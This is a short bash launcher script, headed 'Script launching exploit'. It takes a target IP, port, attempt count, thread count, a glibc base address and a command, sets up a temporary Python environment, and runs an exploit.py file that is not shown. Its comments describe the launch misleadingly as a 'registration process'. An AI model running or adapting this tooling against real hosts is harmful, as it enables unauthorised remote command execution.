#!/bin/bash
# -------------------------------------------------------
# Copyright (c) [2024] FASNY
# All rights reserved
# -------------------------------------------------------
# Script launching exploit 
# -------------------------------------------------------
# Nad√®ge LEMPERIERE, @25th november 2024
# Latest revision: 25th november 2024
# -------------------------------------------------------

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Parse arguments from flags
args=""
while getopts i:p:a:t:g:c: flag
do
    case "${flag}" in
          i) args+=" --target-ip ${OPTARG}";;
          p) args+=" --target-port ${OPTARG}";;
          a) args+=" --max-attempts ${OPTARG}";;
          t) args+=" --num-threads ${OPTARG}";;
          g) args+=" --glibc-base ${OPTARG}";;
          c) args+=" --command ${OPTARG}";;
    esac
done
echo ${args}

# Create virtual environment
python3 -m venv /tmp/register
. /tmp/register/bin/activate

# Install required python packages
pip install --quiet -r $scriptpath/requirements.txt

# Launch registration process
python3 $scriptpath/exploit.py run $args

# Deactivate virtual environment
deactivate
rm -Rf /tmp/register/
